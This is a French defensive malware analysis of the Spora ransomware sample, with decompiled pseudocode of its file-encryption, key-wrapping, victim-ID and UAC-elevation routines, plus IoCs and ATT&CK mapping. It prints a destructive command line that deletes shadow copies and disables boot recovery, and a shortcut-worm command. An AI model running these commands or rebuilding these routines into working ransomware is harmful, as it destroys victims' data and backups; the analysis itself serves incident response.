# Trojan-Ransom.Win32.Spora.a — Analyse détaillée

Langue : Français | English version: [README_EN.md](README_EN.md)

**Sample (fichier local) :** `Trojan-Ransom.Win32.Spora.a-7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02`  
**Famille :** Spora (ransomware Windows, campagne début 2017) — offline (pas de C2 pour obtenir la clé)  
**Détections :** Kaspersky `Trojan-Ransom.Win32.Spora.a` ; Malwarebytes `Ransom.Spora` (payload MD5 `4a4a6d26…` = **ce** sample)  
**Any.RUN :** https://any.run/report/7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02/efb609d2-36d0-4026-a42b-5fcb30307c68  
**Task ID :** `efb609d2-36d0-4026-a42b-5fcb30307c68` (Win10 19044 x64, durée **150 s**, UAC autoconfirm **on**, 2026-02-02)  
**Sources :** PE + **Hex-Rays 9.4** (`Trojan-Ransom.Win32.Spora.a-7ad9ed23….c`, 49 fonctions) + déchiffrement AES blobs + Any.RUN + write-ups (Malwarebytes, McAfee) sur **ce** MD5

> Analyse **défensive / IR** uniquement. Le binaire n’a **pas** été exécuté hors sandbox tierce.

---

## 0. Synthèse Any.RUN ↔ code

| Observation Any.RUN | Confirmation Hex-Rays / artefacts |
|---------------------|-----------------------------------|
| Verdict *Malicious* / tags `spora` `ransomware` `auto-startup` | Famille Spora ; même SHA256 |
| PID **676** MEDIUM → chiffrement + `.KEY` / `.HTML` | `start` sans `/u` : états 0→6, `sub_404DE2`, `sub_404006` |
| UAC « SporaRansomware.exe » (`screen_01`) | `sub_405783` : `runas` + `/c "%s" /u`, retry ×10 / `Sleep(0x400)` |
| PID **8360** HIGH + `WMIC` → VSS/bcdedit | `sub_405846` (chemin `/u` et état 5) |
| Drop `US423-7EXZT-ZTZTR-OTRGT-XYYYY.KEY` | `sub_403C45` + `sub_404006` (`aSKey`) |
| Note `….HTML` dans Edge | HTML decrypté `sub_40507A` ; placeholders `{key}`/`{data}` |
| Fichiers non renommés | `sub_404DE2` : encrypt in-place + footer 132 o |
| `IsShortcut` deleted | `sub_40589D` |
| Pas de C2 malware | Offline ; portal `spora.bz` dans la note |

**ID victime (Any.RUN) :** `US423-7EXZT-ZTZTR-OTRGT-XYYYY`

---

## 1. Point d’entrée — `start` @ `0x4058E7`

| Champ PE | Valeur |
|----------|--------|
| Type | PE32 GUI, 2 sections, **24576** o, pas d’overlay |
| EP | RVA `0x58E7` → VA **`0x4058E7`** (`start`) |
| TimeDateStamp | `0x5875544A` → **2017-01-10 21:38:18 UTC** |
| DIE | VS2008 (Linker 9.00 / VC++ 15.00) |
| Manifest | `asInvoker` |

### Hashes

| Algo | Valeur |
|------|--------|
| MD5 | `4a4a6d26e6c8a7df0779b00a42240e7b` |
| SHA1 | `8072bada086040e07fa46ce8c12bf7c453c0e286` |
| SHA256 | `7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02` |

### Flow Hex-Rays (commenté)

```c
// start @ 0x4058E7
SetErrorMode(1);
GetModuleFileNameW(self);
os_ver = sub_405692(self);                    // packing maj/min
GetVolumeInformationW(... &VolumeSerialNumber ...);
pOptionalEntropy = { &VolumeSerialNumber, 4 }; // sel DPAPI
RtlComputeCrc32 = GetProcAddress(ntdll, "RtlComputeCrc32");
memset/memcpy   = GetProcAddress(ntdll, ...);

elevated = StrStrW(GetCommandLineW(), L"/u") != NULL;

if (!elevated) {
  wsprintfW(name, L"m%u", VolumeSerialNumber); // aMU — pas un simple "m"
  if (OpenMutexW(SYNCHRONIZE, FALSE, name)) ExitProcess(0);
  CreateMutexW(NULL, FALSE, name);
} else {
  sub_405846();  // wmic → vssadmin + bcdedit
  sub_40589D();  // delete IsShortcut
  // re-walk catégories 1..6 + encrypt (sub_40500E)
  ExitProcess(0);
}

// fichier d'état : %AppData%\<VolumeSerial>
hObject = CreateFileW(... L"\%u" ...);
CryptAcquireContextW(..., PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
if (!sub_40507A()) ExitProcess(0);  // decrypt blobs AES
state = sub_404BD1();               // dword DPAPI slot 0
// machine d'états 0..6 (voir §1.1)
```

### 1.1 Machine d’états (reprise)

Persistée par `CryptProtectData` / `CryptUnprotectData` (`sub_404B2E` / `sub_404A96`) dans `%AppData%\<VolumeSerial>`, entropy = serial volume.

| État | Code | Rôle |
|------|------|------|
| **0** | enum + stream chemins (`sub_403902`, `sub_403A98`) | Si liste non vide → `sub_404BC0(1)` |
| **1** | reprise | Enchaîne génération RSA / `.KEY` |
| **2** | `CryptGenKey(0xA400, 0x4000001)` + `sub_403E11` + `sub_403C45` + `sub_404006` | RSA-1024 victime + écrit `.KEY` → état 3 |
| **3** | boucle cat. 1..6 → `sub_40500E` → `sub_404DE2` | Chiffrement fichiers → état 4 |
| **4** | note HTML + `.LST` (`sub_4044E6`, `sub_404753`) | → état 5 |
| **5** | si OS ≥ Vista : déjà admin ? `sub_405846` sinon `sub_405783` ; `sub_40589D` | UAC / VSS → état 6 |
| **6** | `ShellExecuteExW` sur `\<ID>.HTML` ; `sub_40561E` | Affiche la note |

**Pourquoi :** un kill mid-run ne régénère pas une nouvelle RSA et ne double-chiffre pas.

---

## 2. Init — mutex, blobs AES, pubkey

### 2.1 Mutex `m%u`

```c
wsprintfW(v0, L"m%u", VolumeSerialNumber);
if (OpenMutexW(1, FALSE, v0)) ExitProcess(0);
CreateMutexW(NULL, FALSE, v0);
```

Uniquement sur le chemin **sans** `/u`. Single-instance **par serial de volume**.

### 2.2 `sub_40502E` / `sub_40507A`

PLAINTEXTKEYBLOB @ VA `0x4011A8` : AES-256  
`67e8a557a701f60b9c7e7a9833b80b2f30e6afcda8f236e88c7bce10ca4f6977`

```c
// sub_40502E
CryptImportKey(hProv, hardcoded_blob, 0x2C, ...);
CryptDecrypt(phKey, 0, FALSE, 0, pbData, &pdwDataLen); // in-place

// sub_40507A — ordre
sub_40502E(RSA_PEM_buf, 0x120);   // 0x4011F8
sub_40502E(HTML_buf,    0x1D80);  // 0x401318
sub_40502E(sample_id,   0x20);    // 0x4011D4 → "D283C31972"
sub_40502E(buf_403098,  0x20);    // → zéros
```

Rejoué hors bande en AES-CBC / IV nul : [`extract_aes_blobs.py`](extract_aes_blobs.py) → [`artefacts/`](artefacts/).

### 2.3 Pubkey RSA auteurs

[`artefacts/rsa_public_key.pem`](artefacts/rsa_public_key.pem) — RSA-1024, e=65537 (identique Malwarebytes pour ce MD5). Importée runtime (`CryptImportPublicKeyInfo`) → `::phKey` pour wrapper la clé AES du `.KEY`.

---

## 3. Raccourcis / worm — `sub_4050C8` / `sub_40589D`

```c
// sub_40589D
RegOpenKeyExW(HKLM, L"SOFTWARE\\Classes\\lnkfile", ..., KEY_SET_VALUE, ...);
RegDeleteValueW(hk, L"IsShortcut");
SHChangeNotify(SHCNE_ASSOCCHANGED, ...);

// sub_4050C8 — IShellLink
SetFileAttributesW(folder, FILE_ATTRIBUTE_HIDDEN);
CoCreateInstance(CLSID_ShellLink, ...);
wsprintfW(args, L"/c explorer.exe \"%s\" & type \"%s\" > \"%%tmp%%\\%s\" & start \"%s\" \"%%tmp%%\\%s\"", ...);
// PersistFile → folder.lnk
```

Aussi : noms `%08x-%04x-….exe`, `:Zone.Identifier`, copies Startup (tag Any.RUN).

---

## 4. Élévation — `sub_405783`

```c
wsprintfW(params, L"/c \"%s\" /u", self_path);
pExecInfo.lpFile = L"cmd.exe";
pExecInfo.lpVerb = L"runas";
pExecInfo.nShow  = SW_HIDE;
for (i = 0; i < 10; ++i) {
  if (ShellExecuteExW(&pExecInfo)) break;
  Sleep(0x400);  // 1024 ms — UAC insistante
}
```

État 5 : si `os_ver >= 0x600` et `sub_4056F6() != 12288` (pas High Integrity) → UAC ; sinon `sub_405846` directement. **Pas de bypass UAC.**

---

## 5. Anti-recovery — `sub_405846`

```c
pExecInfo.lpFile = L"wmic.exe";
pExecInfo.lpParameters =
  L"process call create \"cmd.exe /c vssadmin.exe delete shadows /all /quiet"
  L" & bcdedit.exe /set {default} recoveryenabled no"
  L" & bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures\"";
for (i = 0; i < 10; ++i) {
  if (ShellExecuteExW(&pExecInfo)) break;
  Sleep(0x10);
}
```

Any.RUN : `Spora` → `WMIC` → `cmd` → `vssadmin` / `bcdedit`.

---

## 6. Walk / catégories — `sub_4037EA` / `sub_4037C0`

### Catégories (compteurs → ID + `.KEY`)

| Cat. | Extensions |
|------|------------|
| **1** | `.xls` `.doc` `.xlsx` `.docx` `.rtf` `.odt` |
| **2** | `.pdf` |
| **3** | `.psd` `.dwg` `.cdr` |
| **4** | `.cd` `.mdb` `.1cd` `.dbf` `.sqlite` `.accdb` |
| **5** | `.jpg` `.jpeg` `.tiff` |
| **6** | `.zip` `.rar` `.7z` `.backup` |

`sub_403BEF` remplit `dword_405E90..405EA4`. Encrypt (état 3 / `/u`) : `for (k=1;k<=6;++k)` filtre `sub_4037EA == k`.

### Dossiers exclus (`sub_4037C0`, 4 premiers de `off_4030B8`)

`windows` · `program files` · `program files (x86)` · `games`

Walk : `sub_4038B1` (26 lettres) + récursion `sub_403902` ; partages `sub_403A98` (`WNetOpenEnumW`).

---

## 7. Crypto fichiers + `.KEY`

### 7.1 Payload victime — `sub_403E11`

```c
CryptExportKey(hRSA, ..., PRIVATEKEYBLOB, ...);
CryptBinaryToStringA(...);  // Base64
"-----BEGIN RSA PRIVATE KEY-----\r\n" + b64 + "-----END ...\r\n"
+ "%02hu.%02hu.%04hu|"   // date
+ username + "|"
+ locale (LOCALE_SABBREVCTRYNAME) + "|"
+ sample_id ("D283C31972") + "|"
+ "%u|%u|%u|%u|%u|%u"    // compteurs cat. 1..6
```

### 7.2 ID victime — `sub_403C45` (détail)

#### À quoi ça sert ? (lecture « non expert »)

Quand Spora a fini de préparer les clés de la victime, il invente un **identifiant unique** du type :

`US423-7EXZT-ZTZTR-OTRGT-XYYYY`

On le retrouve partout :
- nom du fichier **`.KEY`** (à uploader sur le site de rançon),
- nom de la **note HTML**,
- parfois un **`.LST`**.

Ce n’est **pas** un mot de passe magique qui déchiffre tout seul. C’est une **étiquette** qui mélange :

1. **où** tourne la machine (pays Windows, ex. `US`),
2. une **empreinte** (MD5) du « dossier » crypto de cette infection,
3. des **stats** : combien de fichiers de chaque type ont été vus (Office, PDF, images…).

Sur le site `spora.bz`, la victime colle / uploade cet ID (via le `.KEY`) : les opérateurs savent **quelle** infection traiter et peuvent **estimer** la rançon (beaucoup de bases / archives → prix plus haut).

Entrée code : le gros texte ASCII de `sub_403E11` (clé privée PEM + date + user + stats).  
Sortie : une chaîne Unicode allouée (`LocalAlloc 0xB4`) utilisée comme **stem** de fichier.

---

#### A. Tête (8 caractères) — « qui / quelle infection »

**En clair :** les 8 premiers caractères disent *pays* + *début d’empreinte MD5*, avec un tiret au milieu pour que ça ressemble à un numéro de dossier.

```c
// sub_403C45 @ 0x403C45
CryptCreateHash(hProv, CALG_MD5 /*0x8003*/, 0, 0, &hHash);
CryptHashData(hHash, payload, strlen(payload), 0);
CryptGetHashParam(hHash, HP_HASHVAL, md5, &16, 0);   // 16 octets

GetLocaleInfoW(LOCALE_USER_DEFAULT /*0x400*/,
               LOCALE_SABBREVCTRYNAME /*7*/,
               country, 16);
country[2] = L'\0';   // force exactement 2 lettres (US, RU, …)

// aS02x01x01x01x = L"%s%02X%01X-%01X%01X"
wsprintfW(id,
          L"%s%02X%01X-%01X%01X",
          country,          // [0..1]
          md5[0],           // [2..3]  %02X
          md5[1] >> 4,      // [4]     %01X
          md5[1] & 0x0F,    // [6]     après le '-'
          md5[2] >> 4);     // [7]
// Exemple : "US" + "42" + "3" + "-" + "7" + "E"  →  "US423-7E"
```

| Position | Ce qu’on lit | Traduction simple |
|---------:|--------------|-------------------|
| 0–1 | `US` | Pays Windows de la session |
| 2–3 | `42` | 1er octet du MD5 en hex |
| 4 | `3` | moitié haute du 2e octet MD5 |
| 5 | `-` | séparateur cosmétique |
| 6 | `7` | moitié basse du 2e octet MD5 |
| 7 | `E` | moitié haute du 3e octet MD5 |

**Pourquoi un MD5 ici ?** Si on ne mettait que les stats, deux PC avec les mêmes comptes de fichiers auraient le même ID. Le MD5 dépend du **contenu** du payload (donc de la clé privée générée + la machine) → ID **stable pour cette infection**, différent pour une autre.

---

#### B. Queue — « combien de fichiers de chaque type »

**En clair :** après la tête, Spora encode six nombres séparés par `|` :

`nombre_office|pdf|dessin|bases|images|archives`

Mais au lieu d’écrire `10|0|0|23…` (trop « technique » / moche dans une URL), il **substitue** chaque chiffre (et le `|`) par une lettre « jolie », puis recolle des `-` tous les 5 caractères — comme un numéro de série.

```c
// compteurs remplis par sub_403BEF (cat. 1..6)
wsprintfA(stats, "%u|%u|%u|%u|%u|%u",
          cnt[1], cnt[2], cnt[3], cnt[4], cnt[5], cnt[6]);

pos = 8;           // juste après la tête
group = 2;         // "7E" a déjà pris 2 slots du groupe de 5 en cours

for (p = stats; *p; ++p) {
    if (group == 5) {          // frontière de groupe
        id[pos++] = L'-';
        group = 0;
    }
    switch (*p) {
        case '|': ch = L'T'; break;
        case '0': ch = L'Z'; break;
        case '1': ch = L'X'; break;
        case '2': ch = L'R'; break;
        case '3': ch = L'O'; break;
        case '4': ch = L'A'; break;
        case '5': ch = L'H'; break;
        case '6': ch = L'F'; break;
        case '7': ch = L'G'; break;
        case '8': ch = L'E'; break;
        case '9': ch = L'K'; break;
        default:  continue;
    }
    id[pos++] = ch;
    ++group;
}

// padding : compléter le dernier groupe avec 'Y'
while (group < 5) {
    id[pos++] = L'Y';
    ++group;
}
```

| Si le texte contient… | On affiche… | Rôle |
|----------------------:|:-----------:|------|
| `0` … `9` | `Z` … `K` | chiffres déguisés |
| `\|` | `T` | séparateur entre catégories |
| (fin de groupe) | `-` | découpage lisible |
| (reste du groupe) | `Y` | rembourrage sans signification |

Le `group = 2` au départ n’est pas un bug : la tête se termine déjà par `7E` (2 caractères **après** le premier `-`), donc le prochain tiret arrive après seulement 3 lettres de stats (`XZT-…`).

---

#### C. Exemple Any.RUN (ce sample) — lire l’ID comme une phrase

```text
ID observé :  US423-7EXZT-ZTZTR-OTRGT-XYYYY

US423-7E | XZT | ZTZTR | OTRGT | XYYYY
└─tête─┘   └──────── queue (stats + pad) ────────┘
```

| Morceau | Signifie |
|---------|----------|
| `US` | Windows en locale « États-Unis » |
| `423-7E` | empreinte MD5 (début) de **cette** infection |
| `XZT-ZTZTR-OTRGT-X` | stats encodées → en clair **`10\|0\|0\|23\|27\|1`** |
| `YYYY` | padding (ignorer à l’analyse) |

Stats décodées sur la sandbox Any.RUN :

| Catégorie | Sens (rappel §6) | Compte |
|----------:|------------------|-------:|
| 1 | Office (doc/xls/…) | 10 |
| 2 | PDF | 0 |
| 3 | PSD/DWG/CDR | 0 |
| 4 | Bases (mdb/sqlite/…) | 23 |
| 5 | Images | 27 |
| 6 | Archives / backup | 1 |

Réimplémentation / décodeur : [`artefacts/spora_victim_id.py`](artefacts/spora_victim_id.py)

```bash
python3 artefacts/spora_victim_id.py decode US423-7EXZT-ZTZTR-OTRGT-XYYYY
python3 artefacts/spora_victim_id.py demo
```

---

### 7.3 Écriture du fichier `.KEY` — `sub_404006`

#### À quoi ça sert ? (lecture « non expert »)

Le `.KEY` est le **ticket de synchronisation** entre la victime et les opérateurs :

- Il contient (chiffré) la **clé privée RSA de la victime** + infos machine (cf. §7.1).
- Sans ce fichier (ou son équivalent collé dans la note HTML), les auteurs **ne peuvent pas** reconstruire les clés fichier même après paiement « générique ».
- La victime n’a **pas** besoin de Tor pour générer le `.KEY` : tout est local → d’où le marketing « offline ».

Schéma mental :

```text
  ┌─────────────────────┐
  │ Payload clair (§7.1)│  = PEM privkey + date + user + stats
  └──────────┬──────────┘
             │  chiffré avec une AES jetable (session)
             ▼
  ┌─────────────────────┐
  │ Corps du .KEY       │
  └──────────┬──────────┘
             │
  ┌──────────┴──────────┐
  │ 128 octets : AES    │  elle-même chiffrée avec la
  │ session wrappée RSA │  **pubkey des auteurs** (embarquée)
  └─────────────────────┘
```

Seul quelqu’un qui possède la **clé privée des auteurs** (pas dans le malware) peut ouvrir la « enveloppe » de 128 octets, récupérer l’AES session, puis lire le corps → privkey victime → déchiffrer les fichiers.

#### Code (nettoyé)

```c
// sub_404006(payload, victim_id)
CryptGenKey(hProv, CALG_AES_256, CRYPT_EXPORTABLE, &aes_session);

CryptExportKey(aes_session, 0, PLAINTEXTKEYBLOB, 0, blob, &len128);
CryptEncrypt(authors_RSA /* ::phKey */, 0, TRUE, 0, blob, &len128, 0x80);
// → blob = AES session protégée par RSA auteurs (128 o pour RSA-1024)

padded = (strlen(payload) & ~0x1F) + 32;   // alignement / padding CryptoAPI
CryptEncrypt(aes_session, 0, FALSE, 0, payload, &padded, padded);
// → payload buffer devient le corps chiffré (in-place)

path = %AppData% + "\\" + victim_id + ".KEY";   // CSIDL_APPDATA = 26
WriteFile(corps);
WriteFile(blob, 128);

// copies de confort pour la victime / l'opérateur
CopyFile → Desktop (CSIDL 0) et CSIDL 21;
sub_4038B1(sub_403FB3) → copie aussi sur chaque volume « fixed » (type 3);
```

#### Ce qu’on voit sur disque / en sandbox

| Observation | Explication |
|-------------|-------------|
| `US423-….KEY` sur le Bureau **et** dans `%AppData%` | Même contenu ; redondance pour que l’utilisateur le trouve |
| Fichier binaire (pas du texte) | Corps AES + queue 128 o — **pas** la privkey en clair |
| Taille ≈ len(payload paddé) + 128 | Cohérent avec le layout ci-dessus |
| Pas de C2 au moment de la création | Le `.KEY` est prêt **avant** tout paiement |

**Pour l’IR :** collecter **tous** les `*.KEY` (AppData, Desktop, racines de disques). Sans eux, même un decryptor officiel ne sait pas quelle privkey victime utiliser.

---

### 7.4 Chiffrement d’un fichier utilisateur — `sub_404DE2`

#### À quoi ça sert ? (lecture « non expert »)

Pour **chaque** document ciblé (`.docx`, `.jpg`, …) Spora :

1. Vérifie s’il n’est **pas déjà** chiffré (sinon il passe au suivant — important pour la reprise d’état §1.1),
2. Chiffre le contenu **sur place** (le nom ne change pas : `facture.docx` reste `facture.docx`),
3. Ajoute à la **fin** du fichier 132 octets d’« étiquette » crypto.

Analogie : on remplace le contenu du classeur, on laisse la couverture, et on colle une **fiche technique** (clé + checksum) sur la dernière page.

`sub_40500E` rappelle `sub_404DE2` jusqu’à **5 fois** avec `Sleep(16 ms)` si le fichier est verrouillé (Word ouvert, antivirus, etc.).

#### Étape 1 — « déjà chiffré ? »

```c
// lit les 132 derniers octets
SetFilePointer(h, -132, NULL, FILE_END);
ReadFile(..., key_blob, 128, ...);
ReadFile(..., &crc_stored, 4, ...);

if (RtlComputeCrc32(0, key_blob, 128) == crc_stored)
    return 2;   // oui → ne pas retoucher
```

**Pourquoi un CRC32 ?** Les 128 octets sont de la donnée haute entropie (clé wrappée). Le CRC sert de **marqueur local** : « ces 132 octets sont bien un footer Spora », sans renommer le fichier et sans base de données externe.

#### Étape 2 — chiffrer (au plus 5 Mo d’un coup)

```c
// taille mappée : fichier entier aligné à 32 o, plafonné à 5 MiB
if (file_size < 0x500000)
    map_sz = file_size & ~0x1F;
else
    map_sz = 0x500000;          // 5 242 880 octets

MapViewOfFile(...);             // vue mémoire lecture/écriture

CryptGenKey(..., CALG_AES_256, ...);           // clé **unique à ce fichier**
CryptExportKey(..., PLAINTEXTKEYBLOB, key_blob, &128);
CryptEncrypt(victim_RSA, ..., key_blob, ...);  // seul le propriétaire du RSA victime peut unwrap
CryptEncrypt(file_AES, ..., mapped_view, ...); // contenu devient illisible

crc = RtlComputeCrc32(0, key_blob, 128);
SetFilePointer(h, 0, NULL, FILE_END);
WriteFile(key_blob, 128);
WriteFile(&crc, 4);
```

#### Ce qu’on voit concrètement

| Avant | Après |
|-------|-------|
| `rapport.docx` (lisible) | Toujours nommé `rapport.docx` |
| Contenu Office/PDF/JPEG reconnaissable | Contenu haute entropie (souvent les **premiers ≤ 5 Mo**) |
| Taille N | Taille **N + 132** (si le footer n’y était pas) |
| Attribut lecture seule | Enlevé le temps du traitement |

#### Points importants pour l’analyste / l’IR

1. **Pas d’extension `.spora`** : la détection se fait au contenu (footer) ou comportement, pas au nom.  
2. **Une AES par fichier** : deux copies du même document → deux ciphertext différents.  
3. **Plafond 5 MiB** : sur un gros `.zip` / `.vhdx`, seul le début est mappé/chiffré dans ce passage — le footer indique quand même « traité Spora ».  
4. La clé fichier n’est récupérable que si on a la **privkey RSA victime**, elle-même dans le `.KEY` protégé par la **privkey auteurs**.

| Point | Valeur |
|-------|--------|
| Footer | **132** octets = 128 (clé fichier @ RSA victime) + 4 (CRC32) |
| Chunk max / appel | **5 MiB** |
| Rename | **aucun** |
| Readonly | clear avant ouverture |
| Retries | 5 × (`sub_40500E`) |


## 8. Note de rançon (HTML)

[`artefacts/ransom_note.html`](artefacts/ransom_note.html) · [`artefacts/ransom_note_readable.txt`](artefacts/ransom_note_readable.txt)

- Titre **Spora Ransomware**, texte **russe**  
- Portal **`https://spora.bz`**  
- Placeholders `{key}` / `{data}` (`sub_404428`)  
- Any.RUN : `screen_02` / `screen_04` (Edge), `screen_03` (bureau + `.KEY`)

---

## 9. Timeline

```
t0  PID 676 MEDIUM — mutex m%u, sub_40507A, états 0→4 (enum, RSA, encrypt, note)
t1  État 5 — sub_405783 → UAC (screen_01) → PID 8360 HIGH /u
t2  sub_405846 VSS/bcdedit ; sub_40589D IsShortcut ; éventuellement re-encrypt
t3  État 6 — ouverture HTML ; fin run sandbox 150 s
```

---

## 10. IoCs

| Type | Valeur |
|------|--------|
| SHA256 | `7ad9ed23a91643b517e82ad5740d24eca16bcae21cfe1c0da78ee80e0d1d3f02` |
| MD5 | `4a4a6d26e6c8a7df0779b00a42240e7b` |
| Sample ID | `D283C31972` |
| Mutex | `m%u` (serial volume) |
| Artefacts | `*.KEY`, `*.HTML`, `*.LST`, `%AppData%\<serial>` (état DPAPI) |
| Footer | +132 octets |
| Cmd | `wmic … vssadmin … bcdedit …` |
| Reg | `HKLM\SOFTWARE\Classes\lnkfile\IsShortcut` deleted |
| URL | `https://spora.bz` |

---

## 11. ATT&CK

| Technique | ID | Preuve code |
|-----------|-----|-------------|
| Data Encrypted for Impact | T1486 | `sub_404DE2` |
| Inhibit System Recovery | T1490 | `sub_405846` |
| Abuse Elevation Control | T1548.002 | `sub_405783` |
| Boot/Logon Autostart | T1547.001 | Startup / Any.RUN |
| Hide Artifacts | T1564 | `sub_40589D`, `sub_4050C8` |
| Indicator Removal | T1070 | `:Zone.Identifier` |
| Cmd/Script Interpreter | T1059.003 | `cmd` / `wmic` |
| Removable Media | T1091 | shortcuts worm |

---

## 12. Captures

Voir [`anyrun_screenshots/README_captures.md`](anyrun_screenshots/README_captures.md).

---

## 13. Fichiers produits

| Fichier | Rôle |
|---------|------|
| `README.md` / `README_EN.md` | Rapport FR / EN |
| `….c` | Hex-Rays 9.4 |
| `extract_aes_blobs.py` | Re-extraction AES |
| `artefacts/*` | Clé, ID, PEM/DER, note HTML |
| `artefacts/spora_victim_id.py` | Encode/decode ID victime (`sub_403C45`) |
| `anyrun_screenshots/*` | Preuves sandbox |

---

## 14. Références

- Malwarebytes Labs — *Explained: Spora ransomware* (MD5 `4a4a6d26…`)  
- McAfee — *Spora Ransomware Infects 'Offline'*  
- G DATA — *Spora - the Shortcut Worm…*  
- ID decoder : https://gist.github.com/coldshell/6204919307418c58128bb01baba6478f  
- Any.RUN `efb609d2-36d0-4026-a42b-5fcb30307c68`

**Non vérifié :** exec locale ; decryptor victimes (privkey auteurs **absente** du sample).
